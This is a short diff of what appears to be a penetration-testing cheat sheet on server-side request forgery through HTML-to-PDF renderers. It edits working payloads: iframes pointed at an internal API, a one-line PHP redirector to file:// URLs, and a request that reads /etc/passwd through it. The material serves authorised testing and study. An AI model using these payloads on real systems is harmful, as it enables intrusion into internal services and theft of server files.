@@ -214,13 +214,13 @@ Try or and
 <iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>
 ```
 - If the PDF does not display the response we can test if it does after redirct
-- Run the following PHP script on the server
+- Save the following as redirector.php
 ```php
 <?php header('Location: file://' . $_GET['url']); ?>
 ```
 - Then send the following request (this really comes under LFI)
 ```html
-<iframe src="http://172.17.0.1:8000/redirector.php?url=%2fetc%2fpasswd" width="800" height="500"></iframe>
+<iframe src="http://<server IP>:8000/redirector.php?url=%2fetc%2fpasswd" width="800" height="500"></iframe>
 ```
 
 ### Local File Inclusion
